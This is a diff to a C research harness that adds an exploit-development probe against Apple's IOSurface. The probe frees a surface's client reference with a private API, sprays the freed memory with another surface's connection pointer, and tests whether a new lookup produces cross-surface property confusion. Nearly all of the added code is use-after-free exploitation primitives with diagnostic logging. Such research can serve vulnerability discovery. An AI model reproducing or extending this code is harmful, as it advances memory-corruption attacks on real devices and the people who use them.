@@ -15902,6 +15902,176 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r387: IOSurface UAF + spray + property confusion.
+ * Strategy: Free client ref, spray freed memory with controlled data,
+ * then trigger IOSurface operations to see if the kernel interprets
+ * our sprayed data as surface metadata.
+ *
+ * Key insight from r386: +8 (0x00000001037a0350) is shared between
+ * all client refs for the same surface — it's the connection to the
+ * kernel object. If we corrupt this in a new client ref by spraying
+ * before IOSurfaceLookup allocates, we can redirect operations.
+ *
+ * Also: explore whether IOSurfaceSetValue/CopyValue go through the
+ * kernel when the client ref is fresh vs stale.
+ */
+static void r387_probe(void) {
+    rlog("\n=== r387: IOSurface UAF Spray + Property Confusion ===\n\n");
+    fflush(stdout);
+
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+    IOSurfaceRef (*lookupID)(uint32_t) = dlsym(RTLD_DEFAULT, "IOSurfaceLookup");
+
+    if (!clientRelease || !lookupID) {
+        rlog("  Missing symbols\n");
+        return;
+    }
+
+    /* Phase 1: Determine client ref allocation size by creating multiple surfaces */
+    rlog("  Phase 1: Client ref allocation pattern\n");
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    /* Create 10 surfaces to see allocation pattern */
+    IOSurfaceRef surfs[10];
+    for (int i = 0; i < 10; i++) {
+        surfs[i] = IOSurfaceCreate(props);
+        rlog("    surf[%d]: ptr=%p sid=%u\n", i, surfs[i], IOSurfaceGetID(surfs[i]));
+    }
+
+    /* Check spacing between consecutive allocations */
+    for (int i = 1; i < 10; i++) {
+        intptr_t diff = (intptr_t)surfs[i] - (intptr_t)surfs[i-1];
+        rlog("    diff[%d-%d]: %ld bytes\n", i, i-1, (long)diff);
+    }
+
+    /* Phase 2: Free one surface's client ref and examine the freed region */
+    rlog("\n  Phase 2: Free surf[5] and spray\n");
+    uint32_t sid5 = IOSurfaceGetID(surfs[5]);
+    uintptr_t freed_addr = (uintptr_t)surfs[5];
+
+    /* Set a marker on surf[5] */
+    int mk = 0xDEAD387;
+    CFNumberRef mkv = CFNumberCreate(NULL, kCFNumberIntType, &mk);
+    IOSurfaceSetValue(surfs[5], CFSTR("R387Mark"), mkv);
+    CFRelease(mkv);
+
+    /* Save the +8 value (shared connection pointer) */
+    uint64_t orig_plus8;
+    memcpy(&orig_plus8, ((uint8_t*)surfs[5]) + 8, 8);
+    rlog("    surf[5] +8 before free: 0x%016llx\n", (unsigned long long)orig_plus8);
+
+    /* Free the client ref */
+    clientRelease(surfs[5]);
+    rlog("    After clientRelease:\n");
+    uint64_t post_free_0, post_free_8;
+    memcpy(&post_free_0, (void*)freed_addr, 8);
+    memcpy(&post_free_8, (void*)(freed_addr + 8), 8);
+    rlog("      +0: 0x%016llx\n", (unsigned long long)post_free_0);
+    rlog("      +8: 0x%016llx\n", (unsigned long long)post_free_8);
+
+    /* Phase 3: Spray the freed memory with the +8 value from surf[4] (a different surface) */
+    rlog("\n  Phase 3: Cross-surface +8 swap\n");
+    uint64_t surf4_plus8;
+    memcpy(&surf4_plus8, ((uint8_t*)surfs[4]) + 8, 8);
+    rlog("    surf[4] +8: 0x%016llx\n", (unsigned long long)surf4_plus8);
+    rlog("    surf[5] +8 was: 0x%016llx\n", (unsigned long long)orig_plus8);
+
+    /* Write surf[4]'s +8 into the freed surf[5] location at +8 */
+    memcpy((void*)(freed_addr + 8), &surf4_plus8, 8);
+    rlog("    Wrote surf[4]+8 into freed surf[5]+8\n");
+
+    /* Phase 4: Try IOSurfaceLookup for sid5 — the kernel creates a new client ref,
+     * but the freed memory now has surf[4]'s connection handle. If the new ref
+     * reuses this memory, it might point to surf[4]'s kernel object while
+     * the kernel thinks it's surf[5]. */
+    IOSurfaceRef refound = lookupID(sid5);
+    rlog("\n  Phase 4: IOSurfaceLookup(%u) after spray: %p\n", sid5, refound);
+    if (refound) {
+        /* Check: does the refound ref use our sprayed memory or fresh allocation? */
+        rlog("    refound == freed_addr? %s\n",
+            (uintptr_t)refound == freed_addr ? "YES (memory reuse!)" : "NO (fresh alloc)");
+
+        /* Read +8 from the refound ref */
+        uint64_t refound_plus8;
+        memcpy(&refound_plus8, ((uint8_t*)refound) + 8, 8);
+        rlog("    refound +8: 0x%016llx\n", (unsigned long long)refound_plus8);
+        rlog("    matches surf[4]+8? %s\n", refound_plus8 == surf4_plus8 ? "YES (confused!)" : "NO");
+        rlog("    matches orig surf[5]+8? %s\n", refound_plus8 == orig_plus8 ? "YES (kernel sourced)" : "NO");
+
+        /* Try reading the marker through refound */
+        CFTypeRef rv = IOSurfaceCopyValue(refound, CFSTR("R387Mark"));
+        if (rv) {
+            int v = 0;
+            CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
+            rlog("    R387Mark through refound: 0x%x (expect 0xDEAD387)\n", v);
+            CFRelease(rv);
+        } else {
+            rlog("    R387Mark: NOT FOUND (property confusion?)\n");
+        }
+
+        /* Phase 5: Try setting a property through the refound ref and check if it
+         * appears on surf[4] (would indicate cross-surface confusion) */
+        int xmark = 0xBEEF387;
+        CFNumberRef xmkv = CFNumberCreate(NULL, kCFNumberIntType, &xmark);
+        IOSurfaceSetValue(refound, CFSTR("CrossTest"), xmkv);
+        CFRelease(xmkv);
+
+        CFTypeRef rv4 = IOSurfaceCopyValue(surfs[4], CFSTR("CrossTest"));
+        if (rv4) {
+            int v = 0;
+            CFNumberGetValue((CFNumberRef)rv4, kCFNumberIntType, &v);
+            rlog("    CrossTest on surf[4]: 0x%x (CROSS-SURFACE CONFUSION!)\n", v);
+            CFRelease(rv4);
+        } else {
+            rlog("    CrossTest on surf[4]: not found (no confusion)\n");
+        }
+
+        CFRelease(refound);
+    }
+
+    /* Phase 6: Dump full client ref comparison between surf[4] and a fresh lookup of sid5 */
+    rlog("\n  Phase 6: Full 64-byte comparison\n");
+    IOSurfaceRef fresh5 = lookupID(sid5);
+    if (fresh5) {
+        uint8_t *a = (uint8_t*)surfs[4];
+        uint8_t *b = (uint8_t*)fresh5;
+        rlog("    Off   surf[4]           fresh[5]\n");
+        for (int off = 0; off < 64; off += 8) {
+            uint64_t va, vb;
+            memcpy(&va, a + off, 8);
+            memcpy(&vb, b + off, 8);
+            rlog("    +%02d: 0x%016llx  0x%016llx  %s\n", off,
+                (unsigned long long)va, (unsigned long long)vb,
+                va == vb ? "SAME" : "DIFF");
+        }
+        CFRelease(fresh5);
+    }
+
+    /* Cleanup */
+    for (int i = 0; i < 10; i++) {
+        if (i != 5) CFRelease(surfs[i]);
+    }
+    CFRelease(props);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+
+    rlog("\n=== r387 complete ===\n");
+    fflush(stdout);
+}
+
 /* r386: IOSurface Mach port lifecycle + UAF interaction.
  * Test what happens when we:
  * 1. Create an IOSurface + Mach port
@@ -60065,6 +60235,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 390) {
+            rlog("*** rounds=390: IOSurface UAF Spray + Property Confusion ***\n");
+            rlog("  Cross-surface +8 swap, property confusion test.\n\n");
+            fflush(stdout);
+            r387_probe();
+            goto done;
+        }
         if (rounds == 389) {
             rlog("*** rounds=389: IOSurface Mach Port Lifecycle + UAF ***\n");
             rlog("  Test port-based lookup after clientRelease, kernel object lifetime.\n\n");
@@ -62380,7 +62557,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
